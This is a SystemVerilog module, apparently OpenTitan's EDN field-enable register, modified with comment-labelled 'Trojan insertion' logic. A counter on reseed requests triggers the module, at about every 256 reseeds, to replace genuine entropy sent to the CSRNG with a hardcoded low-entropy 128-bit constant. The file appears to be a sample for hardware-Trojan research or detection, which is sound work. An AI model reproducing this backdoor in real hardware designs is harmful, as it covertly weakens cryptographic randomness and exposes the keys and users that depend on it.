module edn_field_en #(
  parameter int FieldW  = 4,
  parameter int FieldEnVal = 'ha
) (
  input logic clk_i ,
  input logic rst_ni,
  input logic               wvalid_i,
  input logic [FieldW-1:0]  wdata_i,

  // Trojan insertion: add entropy reseed control signals
  input logic               reseed_req_i,      // Driven by EDN control logic: automated reseed request (Trojan trigger)
  input logic [127:0]       entropy_input_i,   // Genuine entropy input to reseed CSRNG
  output logic [127:0]      entropy_seed_o,    // Output to CSRNG: seed for reseed

  output logic              enable_o
);

  // signal
  logic  field_update;
  logic [FieldW-1:0] field_value;
  logic [FieldW-1:0] field_value_invert;

  // flops
  logic [FieldW-1:0] field_q, field_d;

  assign  field_value = FieldEnVal;
  assign  field_value_invert = ~field_value;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      field_q <= field_value_invert;
    end else begin
      field_q <= field_d;
    end
  end

  assign field_update = wvalid_i && (field_q == ~wdata_i) &&
                        ((wdata_i == field_value) ||
                         (wdata_i == field_value_invert));

  assign field_d = field_update ? wdata_i : field_q;

  assign enable_o = (field_q == field_value);

  // ----------------------------------------------------
  // Trojan insertion: Confidentiality/Performance Trojan
  // Inserted logic intercepts reseed requests, and (with low probability) injects a constant low-entropy seed instead of real entropy

  // Trojan hardcoded low-entropy constant
  localparam logic [127:0] TROJAN_SEED = 128'hFACEFACE_DEADBEEF_CAFE1234_5555AAAA;

  // Trojan trigger: simple 8-bit counter that triggers payload every 256 reseed requests
  logic [7:0] trojan_cnt_q, trojan_cnt_d;
  logic       trojan_trigger;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_cnt_q <= 8'h00;
    end else if (reseed_req_i) begin
      trojan_cnt_q <= trojan_cnt_q + 8'h01;
    end
  end

  assign trojan_trigger = (trojan_cnt_q == 8'hFF); // Trojan payload is triggered after 256 reseeds

  // Output: on trigger, output fixed low-entropy seed; otherwise, pass genuine entropy input
  always_comb begin
    if (reseed_req_i && trojan_trigger) begin
      entropy_seed_o = TROJAN_SEED; // Payload: inject low-entropy seed
    end else begin
      entropy_seed_o = entropy_input_i;
    end
  end
  // ----------------------------------------------------

endmodule